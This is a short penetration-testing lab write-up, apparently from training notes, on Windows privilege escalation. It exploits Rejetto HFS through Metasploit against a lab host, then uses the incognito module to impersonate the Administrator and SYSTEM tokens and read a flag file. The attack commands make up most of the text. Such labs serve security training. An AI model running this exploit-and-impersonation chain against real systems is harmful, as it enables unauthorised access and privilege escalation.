# Privilege Escalation: Impersonate

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 2571–2605. Examples are lab-specific and need verification.

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.

**Objective:** Escalate the privilege on a Windows machine.

Tools: Nmap , Metasploit Framework

`NT AUTHORITY\SYSTEM` often succeeds because SYSTEM tokens are local, privileged, and commonly exposed by services; an Administrator account’s token may be absent, filtered (UAC), tied to a different session, or otherwise not duplicable/usable for impersonation.

```bash
nmap demo.ine.local
nmap -sV -p 80 demo.ine.local
searchsploit hfs

msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit
getuid

cat C:\\Users\\Administrator\\Desktop\\flag.txt
//access denied for Administrator

load **incognito**         //to check available token
list_tokens -u

**impersonate_token** ATTACKDEFENSE\\Administrator
getuid
impersonate_token **NT AUTHORITY\SYSTEM**
cat C:\\Users\\Administrator\\Desktop\\flag.txt

got flag.txt
```
